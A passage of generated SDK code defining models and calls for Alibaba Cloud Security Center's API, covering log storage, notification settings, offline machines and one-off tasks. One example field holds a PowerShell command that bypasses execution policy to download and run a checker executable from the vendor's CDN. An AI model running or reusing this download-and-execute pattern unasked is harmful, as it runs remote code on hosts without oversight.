    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLoginSwitchConfigs(): DescribeLoginSwitchConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginSwitchConfigsWithOptions(runtime);
}

model DescribeLogstoreStorageRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeLogstoreStorageResponseBody = {
  logstore?: string(name='Logstore', description='The name of the dedicated Logstore that is used to store full logs of Security Center. The value is fixed as **sas-log**.', example='sas-log'),
  preserve?: long(name='Preserve', description='The purchased log storage capacity, in GB.', example='12240'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='25EC270F-5783-4416-AD7C-1EDF063A039C'),
  ttl?: int32(name='Ttl', description='The number of days during which logs can be retained. The value is fixed as **180**, which indicates that logs can be retained for 180 days.

>  You are not allowed to change the value of this parameter.', example='180'),
  used?: long(name='Used', description='The used log storage capacity, in GB.', example='335'),
  userProject?: string(name='UserProject', description='The name of the dedicated Project that is used to store full logs of Security Center.', example='sas-log-XXXX-cn-hangzhou'),
}

model DescribeLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogstoreStorageResponseBody(name='body'),
}

async function describeLogstoreStorageWithOptions(request: DescribeLogstoreStorageRequest, runtime: Util.RuntimeOptions): DescribeLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogstoreStorage(request: DescribeLogstoreStorageRequest): DescribeLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogstoreStorageWithOptions(request, runtime);
}

model DescribeMachineCanRebootRequest {
  type?: string(name='Type', example='sys'),
  uuid?: string(name='Uuid', example='5b268326-273e-44fc-a0e3-9482435c****'),
}

model DescribeMachineCanRebootResponseBody = {
  canReboot?: boolean(name='CanReboot', example='true'),
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeMachineCanRebootResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeMachineCanRebootResponseBody(name='body'),
}

async function describeMachineCanRebootWithOptions(request: DescribeMachineCanRebootRequest, runtime: Util.RuntimeOptions): DescribeMachineCanRebootResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeMachineCanReboot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeMachineCanReboot(request: DescribeMachineCanRebootRequest): DescribeMachineCanRebootResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeMachineCanRebootWithOptions(request, runtime);
}

model DescribeModuleConfigResponseBody = {
  count?: int32(name='Count', description='The number of configurations for the module.', example='2'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', description='The name of the configuration.', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', description='The ID of the server group to which the server belongs.', example='173'),
          instanceId?: string(name='InstanceId', description='The ID of the server.', example='lb-xxx'),
          instanceName?: string(name='InstanceName', description='The name of the server.', example='ssxxxxxxxx'),
          ip?: string(name='Ip', description='The IP address of the server.', example='2.2.X.X'),
          region?: string(name='Region', description='The region in which the server resides.', example='outside-of-aliyun'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='lb-xxxx-xxxx-xxxx-xxxx'),
        }
      ](name='Items', description='The configuration items.'),
      moduleName?: string(name='ModuleName', description='The name of the module.', example='alihids'),
    }
  ](name='ModuleConfigList', description='An array that consists of the configurations.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether the call is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model DescribeModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeModuleConfigResponseBody(name='body'),
}

async function describeModuleConfigWithOptions(runtime: Util.RuntimeOptions): DescribeModuleConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeModuleConfig(): DescribeModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeModuleConfigWithOptions(runtime);
}

model DescribeNoticeConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='60.191.XX.XX'),
}

model DescribeNoticeConfigResponseBody = {
  noticeConfigList?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='12123414****'),
      currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
      project?: string(name='Project', description='The identifier of the notification item. Valid values:

*   **yundun\\_security_Weekreport**: notification for unhandled vulnerabilities.
*   **yundun\\_sas\\_antiransomware_task**: notification for results of restoration tasks.
*   **sas_healthcheck**: notification for baseline checks.
*   **sas_suspicious**: notification for alerts generated by Security Center.
*   **yundun\\_aegis\\_AV_true**: notification for precision defense.
*   **yundun\\_sas\\_ak_leakage**: notification for AccessKey pair leaks.
*   **yundun\\_sas\\_config_alert**: notification for configuration assessment.
*   **yundun\\_sas\\_vul_Emergency**: notification for urgent vulnerabilities.
*   **yundun\\_webguard_event**: notification for web tamper proofing.
*   **yundun\\_sas\\_cloud\\_native_firewall**: notification for alerts generated by the container firewall feature.
*   **yundun\\_sas\\_cloud\\_native\\_firewall_Defense**: notification for proactive defense implemented by the container firewall feature.
*   **yundun\\_IP_Blocking**: notification for blocked brute-force attacks initiated from malicious IP addresses.
*   **yundun\\_sas\\_anti\\_virus_config**: notification for virus scan.
*   **yundun\\_sas_log**: notification for excess logs.
*   **yundun\\_honeypot_alarm**: notification for alerts generated by the honeypot feature.
*   **aliyun\\_rasp_alarm**: notification for alerts generated by the application security feature.
*   **virusScheduleTask**: notification for completion of scheduled virus scans.
*   **yundun\\_anti_Virus**: notification that no security checks are performed.
*   **sas_vulnerability**: notification for vulnerabilities.
*   **weeklyreport**: notification for weekly reports.
*   **agent**: notification that the Security Center agent is offline.
*   **bruteforcesuccess**: notification for protection against brute-force attacks.
*   **webshell**: notification for webshells.
*   **suspicious**: notification for alerts generated by Server Guard.
*   **patch**: deprecated.
*   **remotelogin**: notification for remote logons.
*   **health**: notification for security checks.
*   **yundun\\_sas\\_cloudsiem_log**: notification of insufficient threat analysis log capacity.
>  If the value is **yundun\\_security_Weekreport**, weekly reports are sent to notify you of unhandled vulnerabilities.', example='sas_suspicious'),
      route?: int32(name='Route', description='The notification method. Valid values:

*   **1**: text message
*   **2**: email
*   **4**: internal message
*   **3**: text message and email
*   **5**: text message and internal message
*   **6**: email and internal message
*   **7**: text message, email, and internal message', example='7'),
      timeLimit?: int32(name='TimeLimit', description='The time period during which Security Center sends notifications. Valid values:

*   **0**: any time
*   **1**: 08:00 to 22:00', example='1'),
    }
  ](name='NoticeConfigList', description='An array that consists of the notification settings.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D185B7FF-E24C-422D-83D3-C2A25C7A2727'),
}

model DescribeNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNoticeConfigResponseBody(name='body'),
}

async function describeNoticeConfigWithOptions(request: DescribeNoticeConfigRequest, runtime: Util.RuntimeOptions): DescribeNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeNoticeConfig(request: DescribeNoticeConfigRequest): DescribeNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNoticeConfigWithOptions(request, runtime);
}

model DescribeNsasSuspEventTypeRequest {
  containerFieldName?: string(name='ContainerFieldName', description='The name of the container field. Valid values:

*   **clusterId**: the ID of the cluster', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the container field.', example='ca3108551c83c4d949106e1ab9e1e****'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the alert type.', example='Unusual Logon'),
  remark?: string(name='Remark', description='The name of the server.', example='testECS'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.212.XX.XX'),
  uuids?: string(name='Uuids', description='The UUIDs of servers. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='f56406cb-916d-42db-b6f7-2ff79e34****'),
}

model DescribeNsasSuspEventTypeResponseBody = {
  eventTypes?: [ 
    {
      name?: string(name='Name', description='The name of the alert type.', example='Unusual Logon'),
      suspEventCount?: int32(name='SuspEventCount', description='The number of assets for which an alert of the type is generated.', example='22'),
      type?: string(name='Type', description='The alert type.', example='Unusual Logon'),
    }
  ](name='EventTypes', description='An array that consists of the information about the alert type.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DescribeNsasSuspEventTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNsasSuspEventTypeResponseBody(name='body'),
}

async function describeNsasSuspEventTypeWithOptions(request: DescribeNsasSuspEventTypeRequest, runtime: Util.RuntimeOptions): DescribeNsasSuspEventTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNsasSuspEventType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeNsasSuspEventType(request: DescribeNsasSuspEventTypeRequest): DescribeNsasSuspEventTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNsasSuspEventTypeWithOptions(request, runtime);
}

model DescribeOfflineMachinesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='4'),
  os?: string(name='Os', description='The operating system of the server.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **osType**, the value of the **Values** parameter indicates an operating system.', example='linux'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5'),
  regionIdStr?: string(name='RegionIdStr', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  regionNo?: string(name='RegionNo', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the public IP address of the server.', example='172.20.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.113.XX.XX'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
}

model DescribeOfflineMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='cn-hangzhou'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shanghai'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the server.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server', example='ALIYUN'),
    }
  ](name='MachineList', description='An array that consists of the information about servers.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model DescribeOfflineMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOfflineMachinesResponseBody(name='body'),
}

async function describeOfflineMachinesWithOptions(request: DescribeOfflineMachinesRequest, runtime: Util.RuntimeOptions): DescribeOfflineMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOfflineMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOfflineMachines(request: DescribeOfflineMachinesRequest): DescribeOfflineMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOfflineMachinesWithOptions(request, runtime);
}

model DescribeOnceTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  endTimeQuery?: long(name='EndTimeQuery', description='The timestamp when the root task ends. Unit: milliseconds.', example='1651766520000'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the root task.

>  You must specify at least one of the **TaskType** and **RootTaskId** parameters.', example='bb5d657479bba5e1d308b6c9e85c9174'),
  startTimeQuery?: long(name='StartTimeQuery', description='The timestamp when the root task starts. Unit: milliseconds.', example='1651737301000'),
  taskId?: string(name='TaskId'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT\\_DEV_OPS**: an O&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection

>  You must specify at least one of the **TaskType** and **RootTaskId** parameters.', example='CLIENT_PROBLEM_CHECK'),
}

model DescribeOnceTaskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  taskManageResponseList?: [ 
    {
      detailData?: string(name='DetailData', description='The execution details of the task. The value of this parameter is in the JSON format.

*   **causeCode**: the returned code for the cause
*   **causeMsg**: the returned information for the cause
*   **resCode**: the returned code of troubleshooting
*   **resMsg**: the returned information about troubleshooting
*   **problemType**: the type of the issue
*   **dispatchType**: the task delivery method
*   **uuid**: the UUID of the server
*   **instanceId**: the instance ID of the server
*   **internetIp**: the public IP address of the server
*   **intranetIp**: the private IP address of the server
*   **instanceName**: the instance name of the server
*   **url**: the download link of the troubleshooting log', example='[
      {
            "dispatchType": "manual",
            "causeMsg": [],
            "causeCode": [],
            "resCode": [
                  "1003"
            ],
            "resMsg": [
                  "powershell -executionpolicy bypass -c \\"(New-Object Net.WebClient).DownloadFile(\\"http://aegis.alicdn.com/download/aegis_client_self_check/win32/aegis_checker.exe\\", $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(\\".\\\\\\\\aegis_checker.exe\\"))\\"; \\"./aegis_checker.exe -b eyJtb2RlIjoxLCJqc3J2X2RvbWFpbiI6W10sImlzc3VlIjoib2ZmbGluZSIsInVwZGF0ZV9kb21haW4iOltdLCJ1dWlkIjoiaW5ldC1lYWUwNDg2Ny0wMDJmLTQyM2QtYWYwMC1jNzJjZDYyOWIyNDgiLCJjbWRfaWR4IjoiNDRjZThiZWI3ZGYyYTQxMjQ1NGM4ZDc5OTE1ODI1MzMifQ==\\""
            ],
            "problemType": "offline",
            "uuid": "inet-eae04867-002f-423d-af00-c72cd629****"
      }
]'),
      failCount?: int32(name='FailCount'),
      progress?: string(name='Progress', description='The progress of the task. Unit: %.', example='10%'),
      resultInfo?: string(name='ResultInfo'),
      successCount?: int32(name='SuccessCount'),
      taskEndTime?: long(name='TaskEndTime', description='The timestamp when the task ends. Unit: milliseconds.', example='1650267989000'),
      taskId?: string(name='TaskId', description='The ID of the task.', example='e900f528f5a6229bb640ca27cb44c98e'),
      taskName?: string(name='TaskName', description='The name of the task.', example='CLIENT_PROBLEM_CHECK'),
      taskStartTime?: long(name='TaskStartTime', description='The timestamp when the task starts. Unit: milliseconds.', example='1649732012000'),
      taskStatus?: int32(name='TaskStatus', description='The status of the task. Valid values:

*   **1**: started
*   **2**: complete
*   **3**: failed
*   **4**: timed out', example='1'),
      taskStatusText?: string(name='TaskStatusText', description='The text description of the status for the task. Valid values:

*   **INIT**: The task is to be started.
*   **START**: The task is started.
*   **DISPATCH**: The self-check command is issued.
*   **SUCCESS**: The self-check is complete.
*   **FAIL**: The task fails.
*   **TIMEOUT**: The task times out.', example='INIT'),
      taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT\\_DEV_OPS**: an O&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection', example='CLIENT_PROBLEM_CHECK'),
    }
  ](name='TaskManageResponseList', description='An array that consists of the tasks.'),
}

model DescribeOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskResponseBody(name='body'),
}

async function describeOnceTaskWithOptions(request: DescribeOnceTaskRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTimeQuery)) {
    query['EndTimeQuery'] = request.endTimeQuery;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.rootTaskId)) {
    query['RootTaskId'] = request.rootTaskId;
  }
  if (!Util.isUnset(request.startTimeQuery)) {
    query['StartTimeQuery'] = request.startTimeQuery;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOnceTask(request: DescribeOnceTaskRequest): DescribeOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskWithOptions(request, runtime);
}

model DescribeOnceTaskLeafRecordPageRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  endTime?: long(name='EndTime', example='1668064495000'),
  pageSize?: int32(name='PageSize', example='20'),
  relateInfo?: boolean(name='RelateInfo', example='true'),
  source?: string(name='Source', example='console_batch'),
  startTime?: long(name='StartTime', example='1648438617000'),
  statusList?: [ string ](name='StatusList'),
  taskId?: string(name='TaskId', example='1471d8ebb96795b41ede090b9758****'),
  taskType?: string(name='TaskType', example='CLIENT_PROBLEM_CHECK'),
}

model DescribeOnceTaskLeafRecordPageResponseBody = {
  onceTasks?: [ 
    {
      endTime?: long(name='EndTime', example='1670307567000'),
      finish?: int32(name='Finish', example='1'),
      finishCount?: string(name='FinishCount', example='67'),
      progress?: long(name='Progress', example='75'),
      realRunTime?: long(name='RealRunTime', example='1670307567000'),
      resultInfo?: string(name='ResultInfo', example='TASK_NOT_SUPPORT_REGION'),
      startTime?: long(name='StartTime', example='1640102400000'),
      status?: string(name='Status', example='0'),
      statusText?: string(name='StatusText', example='SUCCESS'),
      target?: string(name='Target', example='238cf050a7270dd6940602e70f1e5a11eeaf4e02035f445b7f613ff5e064****'),
      targetType?: string(name='TargetType', example='IMAGE'),
      taskId?: string(name='TaskId', example='9fb50f2af8bb67c9fdb684194c83****'),
      taskImageInfo?: {
        digest?: string(name='Digest', example='9e0dc29d872d2e386cc5c0c92b529a84e3acfade16f5cb1d054a2ee3c99****'),
        image?: string(name='Image', example='***s.com/sas_test/baseli***'),
        pod?: string(name='Pod', example='expoit-law-****'),
        regionId?: string(name='RegionId', example='cn-hangzhou'),
        repoId?: string(name='RepoId', example='crr-r88w2vryp8m****'),
        repoName?: string(name='RepoName', example='testyyy'),
        repoNamespace?: string(name='RepoNamespace', example='bitn***'),
        repoRegionId?: string(name='RepoRegionId', example='cn-hangzhou'),
        tag?: string(name='Tag', example='v1.20-002-a2*****'),
      }(name='TaskImageInfo'),
      taskName?: string(name='TaskName', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', example='IMAGE_SCAN'),
      totalCount?: string(name='TotalCount', example='30'),
    }
  ](name='OnceTasks'),
  pageInfo?: {
    count?: int32(name='Count', example='6'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='16'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeOnceTaskLeafRecordPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskLeafRecordPageResponseBody(name='body'),
}

async function describeOnceTaskLeafRecordPageWithOptions(request: DescribeOnceTaskLeafRecordPageRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskLeafRecordPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.relateInfo)) {
    query['RelateInfo'] = request.relateInfo;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTaskLeafRecordPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOnceTaskLeafRecordPage(request: DescribeOnceTaskLeafRecordPageRequest): DescribeOnceTaskLeafRecordPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskLeafRecordPageWithOptions(request, runtime);
}

model DescribePropertyCountRequest {
  type?: string(name='Type'),
  uuidList?: string(name='UuidList'),
}

model DescribePropertyCountResponseBody = {
  autorun?: int32(name='Autorun'),
  cron?: int32(name='Cron'),
  database?: int32(name='Database'),
  lkm?: int32(name='Lkm'),
  port?: int32(name='Port'),
  process?: int32(name='Process'),
  requestId?: string(name='RequestId'),
  sca?: int32(name='Sca'),
  software?: int32(name='Software'),
  user?: int32(name='User'),
  web?: int32(name='Web'),
  webserver?: int32(name='Webserver'),
}

model DescribePropertyCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCountResponseBody(name='body'),
}

async function describePropertyCountWithOptions(request: DescribePropertyCountRequest, runtime: Util.RuntimeOptions): DescribePropertyCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCount(request: DescribePropertyCountRequest): DescribePropertyCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCountWithOptions(request, runtime);
}

model DescribePropertyCronDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by path to the scheduled task is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  source?: string(name='Source', description='The path to the scheduled task.', example='/etc/cron.d/root'),
